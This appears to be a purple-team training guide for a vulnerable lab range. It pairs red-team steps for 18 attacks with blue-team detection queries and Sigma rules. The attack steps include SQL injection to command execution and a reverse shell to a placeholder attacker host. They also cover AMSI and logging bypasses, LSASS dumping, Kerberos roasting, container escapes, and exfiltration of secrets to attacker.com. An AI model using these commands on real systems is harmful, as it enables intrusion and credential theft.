# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE v2.3

This guide covers **18 attack vectors** with step-by-step instructions for:
- 🔴 **Red Team:** Exploitation techniques
- 🔵 **Blue Team:** Detection, hunting, and response

---

## PRE-INSTALLED DETECTION TOOLS

| System | Tool | Status | Notes |
|--------|------|--------|-------|
| DC01 | **Sysmon** | ✅ Active | SwiftOnSecurity config at `C:\Tools\Sysmon\config.xml` |
| DC01 | **ScriptBlock Logging** | ✅ Enabled | PowerShell Event ID 4104 |
| Web01 | **auditd** | ✅ Active | Keys: `identity`, `exec` |

---

# PART 1: IDENTITY & WEB ATTACKS

---

## 🛑 VECTOR 1: SQL Injection

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.10:8080/hr_portal` |
| **Port** | 8080 (XAMPP Apache) |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1190 |

### 🔴 Red Team

**1. Confirm Vulnerability:**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1"
# Returns: Name: Alice Manager

curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
# Returns: Error or blank = SQLi confirmed
```

**2. UNION-Based Extraction:**
```bash
# Find column count
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1 ORDER BY 2--"

# Extract data
curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT name,salary FROM Employees--"
```

**3. Command Execution (xp_cmdshell):**
```bash
# Enable xp_cmdshell
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"

# Execute commands
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"
```

**4. SQLMap (Automated):**
```bash
sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --dbs
sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
```

### 🔵 Blue Team

**Detection - Sysmon (Event ID 1 - Process Creation):**
```powershell
# SQL Server spawning cmd.exe or powershell.exe
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {
        $_.Properties[20].Value -like "*sqlservr*" -and 
        ($_.Properties[4].Value -like "*cmd.exe*" -or $_.Properties[4].Value -like "*powershell*")
    } | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
```

**Detection - Sysmon (Event ID 3 - Network):**
```powershell
# Inbound connections to SQL Server from web server
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=3} |
    Where-Object {$_.Properties[14].Value -eq 1433}
```

**Indicators of Compromise:**
- `sqlservr.exe` spawning `cmd.exe`, `powershell.exe`
- URL parameters containing `UNION`, `SELECT`, `xp_cmdshell`
- `sp_configure` changes in SQL logs

**Sigma Rule:**
```yaml
title: SQL Server Spawning Shell
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith: '\sqlservr.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection
level: critical
```

---

## 🤖 VECTOR 2: AI Prompt Injection / RCE

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.20:5000` |
| **Port** | 5000 |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1059 |

### 🔴 Red Team

**1. Test RCE:**
```bash
curl "http://10.0.0.20:5000/ask?query=id"
# Returns: uid=0(root) gid=0(root)

curl "http://10.0.0.20:5000/ask?query=whoami"
# Returns: root
```

**2. Enumerate System:**
```bash
curl "http://10.0.0.20:5000/ask?query=cat%20/etc/passwd"
curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"
curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/exfil_lab/.env"
```

**3. Reverse Shell:**
```bash
# Attacker: Start listener
nc -lvnp 4444

# Execute (URL-encoded)
curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
```

### 🔵 Blue Team

**Detection - auditd:**
```bash
# Watch for unusual commands via web app
sudo ausearch -k exec -i | grep -E "python|flask" | tail -20

# Watch for sensitive file access
sudo ausearch -f /etc/passwd -i
sudo ausearch -f /home/vagrant/.kube/config -i
```

**Detection - Process Tree:**
```bash
# Python/Flask should NOT spawn bash
ps auxf | grep -A3 python3
```

**Detection - Network:**
```bash
# Outbound connections from Python process
ss -tunap | grep python
netstat -anp | grep python
```

**Indicators of Compromise:**
- Python process spawning `/bin/bash`, `/bin/sh`
- Outbound connections from Flask service
- Access to `.kube/config`, `.env` files

---

## 🔨 VECTOR 3: AS-REP Roasting

| Property | Value |
|----------|-------|
| **Target** | `svc_backup` account |
| **Vulnerability** | `DoesNotRequirePreAuth = True` |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1558.004 |

### 🔴 Red Team

**1. From Kali (No Authentication Required):**
```bash
GetNPUsers.py LAB.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.10 -no-pass
```

**2. Target Specific Account:**
```bash
GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
```

**3. Crack the Hash:**
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `svc_backup:Backup2024!`

### 🔵 Blue Team

**Detection - Security Event ID 4768:**
```powershell
# Kerberos TGT requests without pre-authentication
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768} |
    Where-Object {$_.Properties[4].Value -eq '0x0'} |
    Select-Object TimeCreated, 
        @{N='Account';E={$_.Properties[0].Value}},
        @{N='ClientIP';E={$_.Properties[9].Value}}
```

**Detection - Sysmon Network (Event ID 3):**
```powershell
# Kerberos traffic from unusual sources
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=3} |
    Where-Object {$_.Properties[14].Value -eq 88} |
    Select-Object TimeCreated, @{N='SourceIP';E={$_.Properties[9].Value}}
```

**Sigma Rule:**
```yaml
title: AS-REP Roasting Attempt
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
  filter:
    TargetUserName|endswith: '$'
  condition: selection and not filter
level: high
```

---

## 🎫 VECTOR 4: Kerberoasting

| Property | Value |
|----------|-------|
| **Target** | `svc_sql` account |
| **SPN** | `MSSQLSvc/dc01.lab.local:1433` |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1558.003 |

### 🔴 Red Team

**1. Enumerate SPNs:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10
```

**2. Request TGS Ticket:**
```bash
GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash
```

**3. Crack the Hash:**
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `svc_sql:Password123!`

### 🔵 Blue Team

**Detection - Security Event ID 4769:**
```powershell
# TGS requests with RC4 encryption (weak/suspicious)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
    Where-Object {$_.Properties[5].Value -eq '0x17'} |
    Select-Object TimeCreated,
        @{N='ServiceName';E={$_.Properties[0].Value}},
        @{N='AccountName';E={$_.Properties[2].Value}},
        @{N='ClientIP';E={$_.Properties[6].Value}}
```

**Sigma Rule:**
```yaml
title: Kerberoasting - RC4 TGS Request
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
level: high
```

---

## ☁️ VECTOR 5: Hybrid Identity Attack

| Property | Value |
|----------|-------|
| **Target** | `C:\Program Files\Azure AD Sync\connection.xml` |
| **Credential** | `svc_adsync:Valhalla123!` (Base64) |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1552.001 |

### 🔴 Red Team

**1. Locate Configuration:**
```powershell
Get-ChildItem "C:\Program Files\Azure AD Sync\" -Recurse
type "C:\Program Files\Azure AD Sync\connection.xml"
```

**2. Extract Base64 Password:**
```xml
<PasswordEncrypted>VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==</PasswordEncrypted>
```

**3. Decode:**
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
```

**Result:** `Valhalla123!`

### 🔵 Blue Team

**Detection - Sysmon File Access (Event ID 11):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=11} |
    Where-Object {$_.Properties[5].Value -like "*Azure AD Sync*"} |
    Select-Object TimeCreated, @{N='FileName';E={$_.Properties[5].Value}}
```

**Detection - ScriptBlock Logging (Event ID 4104):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'FromBase64String|connection\.xml'} |
    Select-Object TimeCreated, Message
```

---

## 🛡️ VECTOR 6: AD CS Relay (ESC8)

| Property | Value |
|----------|-------|
| **Target** | `http://10.0.0.10/certsrv` |
| **Port** | 80 (IIS) |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1557.001 |

### 🔴 Red Team

**1. Verify HTTP Web Enrollment:**
```bash
curl -I http://10.0.0.10/certsrv/
# Look for: WWW-Authenticate: NTLM
```

**2. Setup NTLM Relay:**
```bash
# Terminal 1: Start Responder (disable HTTP/SMB)
sudo responder -I eth0 -r -d -w

# Terminal 2: Start ntlmrelayx
ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**3. Trigger Authentication (via SQLi):**
```bash
curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'ping ATTACKER_IP'--"
```

**4. Use Obtained Certificate:**
```bash
# Authenticate as machine account
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
```

### 🔵 Blue Team

**Detection - Certificate Events (4886/4887):**
```powershell
# Certificate requests
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886,4887} |
    Select-Object TimeCreated, Id, 
        @{N='Requester';E={$_.Properties[0].Value}},
        @{N='Template';E={$_.Properties[1].Value}}
```

**Detection - IIS Logs:**
```powershell
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log | Select-String "certsrv"
```

---

# PART 2: DEFENSE EVASION & IN-MEMORY

---

## 🛡️ VECTOR 7: AMSI Bypass

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\AMSILab\` |
| **Vulnerability** | Weak registry ACLs |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1562.001 |

### 🔴 Red Team

**1. Test AMSI Status:**
```powershell
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# If blocked = AMSI active
```

**2. Bypass via Reflection:**
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**3. Bypass via Registry (Lab has weak ACLs):**
```powershell
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse -Force
```

### 🔵 Blue Team

**Detection - Sysmon Registry (Event ID 12/13):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=12,13} |
    Where-Object {$_.Properties[4].Value -like "*AMSI*"} |
    Select-Object TimeCreated, @{N='RegistryPath';E={$_.Properties[4].Value}}
```

**Detection - ScriptBlock Logging:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'} |
    Select-Object TimeCreated, @{N='Script';E={$_.Message.Substring(0,200)}}
```

---

## 🔒 VECTOR 8: VEH/EDR Bypass

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\VEHLab\FakeEDR.exe` |
| **Difficulty** | 🔴 Hard |
| **MITRE** | T1562.001 |

### 🔴 Red Team

**1. Start FakeEDR:**
```cmd
C:\Tools\VEHLab\FakeEDR.exe
```

**2. Bypass Techniques:**
- `RemoveVectoredExceptionHandler()`
- Clear debug registers DR0-DR7
- Unhook ntdll.dll via fresh copy
- Direct syscalls

### 🔵 Blue Team

**Detection - Process Termination (Sysmon Event ID 5):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=5} |
    Where-Object {$_.Properties[4].Value -like "*EDR*" -or $_.Properties[4].Value -like "*Defender*"}
```

---

## 💉 VECTOR 9: Reflective Code Injection

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\ReflectiveLab\VulnerableLoader.cs` |
| **Difficulty** | 🔴 Hard |
| **MITRE** | T1620 |

### 🔴 Red Team

```powershell
$bytes = [IO.File]::ReadAllBytes("C:\path\to\payload.exe")
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)
```

### 🔵 Blue Team

**Detection - Sysmon Image Load (Event ID 7):**
```powershell
# Assemblies loaded without file path
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=7} |
    Where-Object {$_.Properties[4].Value -notlike "C:\*" -and $_.Properties[4].Value -notlike "c:\*"}
```

---

## 👻 VECTOR 10: Process Hollowing

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\HollowingLab\README.txt` |
| **Targets** | notepad.exe, svchost.exe, werfault.exe |
| **Difficulty** | 🔴 Hard |
| **MITRE** | T1055.012 |

### 🔵 Blue Team

**Detection - Suspicious Parent-Child (Sysmon Event ID 1):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {
        $_.Properties[4].Value -like "*notepad*" -and
        $_.Properties[20].Value -notlike "*explorer*"
    }
```

---

## 🔑 VECTOR 11: Credential Dumping

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\CredLab\` |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1003 |

### 🔴 Red Team

**1. Credential Manager:**
```powershell
cmdkey /list
# Shows: fileserver.lab.local, sqlserver.lab.local
```

**2. SAM/SYSTEM Hives (Pre-extracted):**
```bash
# From Kali
secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
```

**3. LSASS Dump:**
```cmd
# comsvcs.dll method (run as SYSTEM)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

### 🔵 Blue Team

**Detection - LSASS Access (Sysmon Event ID 10):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=10} |
    Where-Object {$_.Properties[8].Value -like "*lsass.exe*"} |
    Select-Object TimeCreated,
        @{N='SourceProcess';E={$_.Properties[4].Value}},
        @{N='GrantedAccess';E={$_.Properties[18].Value}}
```

**Sigma Rule:**
```yaml
title: LSASS Memory Dump
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1038'
      - '0x1fffff'
  condition: selection
level: critical
```

---

## 🦎 VECTOR 12: LOLBin Execution

| Property | Value |
|----------|-------|
| **Target** | `C:\Tools\LOLBinLab\payload.csproj` |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1218 |

### 🔴 Red Team

**MSBuild:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj
```

**Certutil:**
```cmd
certutil -urlcache -split -f http://10.0.0.20:8000/payload.exe C:\temp\payload.exe
```

### 🔵 Blue Team

**Detection - Sysmon Process (Event ID 1):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {
        $_.Properties[4].Value -match 'msbuild|certutil|mshta|wmic|rundll32' -and
        $_.Properties[10].Value -match 'http|urlcache|csproj|javascript'
    } | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
```

---

## 📊 VECTOR 13: ETW/Logging Bypass

| Property | Value |
|----------|-------|
| **Target** | ScriptBlock Logging |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1562.002 |

### 🔴 Red Team

```powershell
$s=[Ref].Assembly.GetType('System.Management.Automation.Utils')
$f=$s.GetField('cachedGroupPolicySettings','NonPublic,Static')
$g=$f.GetValue($null)
$g['ScriptBlockLogging']['EnableScriptBlockLogging']=0
```

### 🔵 Blue Team

**Detection:** Monitor for gaps in expected logging volume.

---

## 🔄 VECTOR 14: Persistence

| Property | Value |
|----------|-------|
| **Target** | Scheduled Task: `WindowsDefenderUpdate` |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1053.005 |

### 🔴 Red Team

**Find Hidden Task:**
```powershell
Get-ScheduledTask -TaskName "WindowsDefenderUpdate" | Format-List *
schtasks /query /tn "WindowsDefenderUpdate" /v
```

### 🔵 Blue Team

**Detection - Security Event ID 4698:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698} |
    Select-Object TimeCreated, @{N='TaskName';E={$_.Properties[0].Value}}
```

**Detection - Sysmon (Event ID 1):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
    Where-Object {$_.Properties[4].Value -like "*schtasks*"} |
    Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
```

---

# PART 3: LINUX & CONTAINERS

---

## 🐳 VECTOR 15: Container Escape

| Property | Value |
|----------|-------|
| **Target** | `/home/vagrant/container_lab/` |
| **Containers** | `vuln_privileged`, `vuln_hostsock` |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1611 |

### 🔴 Red Team

**Privileged Container Escape:**
```bash
docker exec -it container_lab-vuln_privileged-1 bash

# Inside container
fdisk -l  # Find host disk
mount /dev/sda1 /mnt
chroot /mnt
cat /etc/shadow
```

**Docker Socket Escape:**
```bash
docker exec -it container_lab-vuln_hostsock-1 bash

# Inside container (install docker CLI first)
apt update && apt install -y docker.io
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
```

### 🔵 Blue Team

**Detection - auditd:**
```bash
# Watch mount syscalls
sudo ausearch -sc mount -i | tail -20

# Watch docker socket access
sudo ausearch -f /var/run/docker.sock -i
```

**Detection - Docker Events:**
```bash
docker events --filter 'type=container' --filter 'event=exec_create'
```

---

## ☸️ VECTOR 16: Kubernetes Attacks

| Property | Value |
|----------|-------|
| **Target** | `/home/vagrant/k8s_lab/vuln-sa.yaml` |
| **ServiceAccount** | `vuln-admin-sa` (cluster-admin) |
| **Difficulty** | 🟡 Medium |
| **MITRE** | T1610 |

### 🔴 Red Team

**1. Check Permissions:**
```bash
kubectl auth can-i --list --as=system:serviceaccount:default:vuln-admin-sa
```

**2. Extract Secrets:**
```bash
kubectl get secrets -A -o yaml --as=system:serviceaccount:default:vuln-admin-sa
```

**3. Deploy Privileged Pod:**
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  serviceAccountName: vuln-admin-sa
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: ubuntu
    securityContext:
      privileged: true
    command: ["sleep", "infinity"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF
```

### 🔵 Blue Team

**Detection - Audit Logs:**
```bash
# K3s audit (if enabled)
sudo cat /var/log/containers/kube-apiserver* | grep -E "secrets|privileged"
```

**Detection - auditd:**
```bash
sudo ausearch -c kubectl -i | tail -50
```

---

## 🐧 VECTOR 17: Linux Privilege Escalation

| Property | Value |
|----------|-------|
| **Target** | sudo, capabilities |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1548 |

### 🔴 Red Team

**Sudo vim Escape:**
```bash
sudo vim -c ':!/bin/bash'
# Now root
```

**Python Capabilities:**
```bash
/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Now root
```

### 🔵 Blue Team

**Detection - auditd:**
```bash
# Watch sudo commands
sudo ausearch -m USER_CMD -i | tail -20

# Watch setuid calls
sudo ausearch -sc setuid -i
```

**Detection - Login Shell Changes:**
```bash
# Monitor /etc/passwd changes
sudo ausearch -k identity -i
```

---

## 📤 VECTOR 18: Data Exfiltration

| Property | Value |
|----------|-------|
| **Target** | `/home/vagrant/exfil_lab/.env` |
| **Data** | Fake API keys, AWS credentials |
| **Difficulty** | 🟢 Easy |
| **MITRE** | T1048 |

### 🔴 Red Team

**View Target Data:**
```bash
cat /home/vagrant/exfil_lab/.env
# API_KEY=sk_live_1234567890abcdef
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

**HTTP Exfil:**
```bash
curl -X POST -d @/home/vagrant/exfil_lab/.env http://attacker.com/collect
```

**SMB Exfil (via Samba share):**
```bash
# From attacker
smbclient //10.0.0.20/share -N
put stolen_data.txt
```

**DNS Exfil:**
```bash
data=$(cat /home/vagrant/exfil_lab/.env | base64 -w0)
nslookup ${data:0:60}.attacker.com
```

### 🔵 Blue Team

**Detection - File Access:**
```bash
sudo ausearch -f /home/vagrant/exfil_lab/.env -i
```

**Detection - Network:**
```bash
# Watch outbound connections
ss -tunap | grep -v LISTEN | grep -v "127.0.0.1"

# Watch Samba logs
sudo tail -f /var/log/samba/log.smbd
```

---

# BLUE TEAM QUICK REFERENCE

## Sysmon Event IDs (DC01)

| ID | Event | Use Case |
|----|-------|----------|
| 1 | Process Create | Detect malicious processes |
| 3 | Network Connection | C2, lateral movement |
| 5 | Process Terminated | EDR tampering |
| 7 | Image Loaded | DLL injection |
| 10 | Process Access | LSASS dumping |
| 11 | File Create | Malware drops |
| 12/13 | Registry | Persistence, AMSI bypass |

## Security Event IDs (DC01)

| ID | Event | Use Case |
|----|-------|----------|
| 4624 | Logon Success | Account usage |
| 4625 | Logon Failure | Brute force |
| 4648 | Explicit Credential | Pass-the-hash |
| 4688 | Process Create | Command lines |
| 4698 | Task Created | Persistence |
| 4768 | TGT Request | AS-REP roasting |
| 4769 | TGS Request | Kerberoasting |
| 4886/4887 | Certificate Request | AD CS abuse |

## auditd Keys (Web01)

| Key | Watches |
|-----|---------|
| `identity` | `/etc/passwd` modifications |
| `exec` | `/bin/bash` execution |

## Quick Hunting Commands

**Windows - All Sysmon:**
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 100 | Out-GridView
```

**Windows - Suspicious PowerShell:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
    Where-Object {$_.Message -match 'Download|IEX|Invoke-|Base64|bypass|-enc'} |
    Select-Object TimeCreated, Message
```

**Linux - Recent auditd:**
```bash
sudo ausearch -i -ts recent
```

**Linux - Failed Logins:**
```bash
sudo grep "Failed password" /var/log/auth.log | tail -20
```

---

*End of Guide. Hunt well.* 🎯
